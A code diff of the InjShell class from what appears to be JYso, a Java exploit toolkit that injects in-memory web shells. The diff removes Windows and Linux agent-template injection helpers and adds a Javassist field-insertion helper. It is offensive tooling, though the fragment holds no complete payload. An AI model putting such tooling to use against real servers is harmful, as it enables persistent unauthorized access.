@@ -8,10 +8,10 @@ import org.apache.commons.cli.CommandLineParser;
 import org.apache.commons.cli.DefaultParser;
 import org.apache.commons.cli.Options;
 
-import java.lang.reflect.Field;
 import java.util.Arrays;
 import java.util.List;
 
+import static com.qi4l.JYso.gadgets.Config.Config.POOL;
 import static com.qi4l.JYso.gadgets.Config.MemShellPayloads.*;
 import static com.qi4l.JYso.gadgets.utils.HexUtils.generatePassword;
 
@@ -241,48 +241,13 @@ public class InjShell {
         ctClass.addField(CtField.make(fieldCode, ctClass));
     }
 
-    public static void TinsertWinAgent(CtClass ctClass) throws Exception {
-        List<CtClass> classes = new java.util.ArrayList<>(Arrays.asList(ctClass.getInterfaces()));
-        classes.add(ctClass.getSuperclass());
-
-        String className = null;
-        for (CtClass value : classes) {
-            className = value.getName();
-            if (Config.KEY_METHOD_MAP.containsKey(className)) {
-                break;
-            }
-        }
-
-        byte[]   bytes        = ctClass.toBytecode();
-        Class<?> ctClazz      = Class.forName("com.qi4l.JYso.template.Agent.WinMenshell");
-        Field    WinClassName = ctClazz.getDeclaredField("className");
-        WinClassName.setAccessible(true);
-        WinClassName.set(ctClazz, className);
-        Field WinclassBody = ctClazz.getDeclaredField("classBody");
-        WinclassBody.setAccessible(true);
-        WinclassBody.set(ctClazz, bytes);
+    public static CtClass insertField(String fieldName, String fieldCode) throws Exception {
+        POOL.insertClassPath(new ClassClassPath(Class.forName(fieldName)));
+        final CtClass ctClass = POOL.get(fieldName);
+        insertField(ctClass, fieldName, fieldCode);
+        return ctClass;
     }
 
-    public static void TinsertLinAgent(CtClass ctClass) throws Exception {
-        List<CtClass> classes = new java.util.ArrayList<>(Arrays.asList(ctClass.getInterfaces()));
-        classes.add(ctClass.getSuperclass());
-
-        String className = null;
-        for (CtClass value : classes) {
-            className = value.getName();
-            if (Config.KEY_METHOD_MAP.containsKey(className)) {
-                break;
-            }
-        }
-        byte[]   bytes        = ctClass.toBytecode();
-        Class<?> ctClazz      = Class.forName("com.qi4l.JYso.template.Agent.LinMenshell");
-        Field    LinClassName = ctClazz.getDeclaredField("className");
-        LinClassName.setAccessible(true);
-        LinClassName.set(ctClazz, className);
-        Field LinclassBody = ctClazz.getDeclaredField("classBody");
-        LinclassBody.setAccessible(true);
-        LinclassBody.set(ctClazz, bytes);
-    }
 
 
     //类加载方式，因类而异
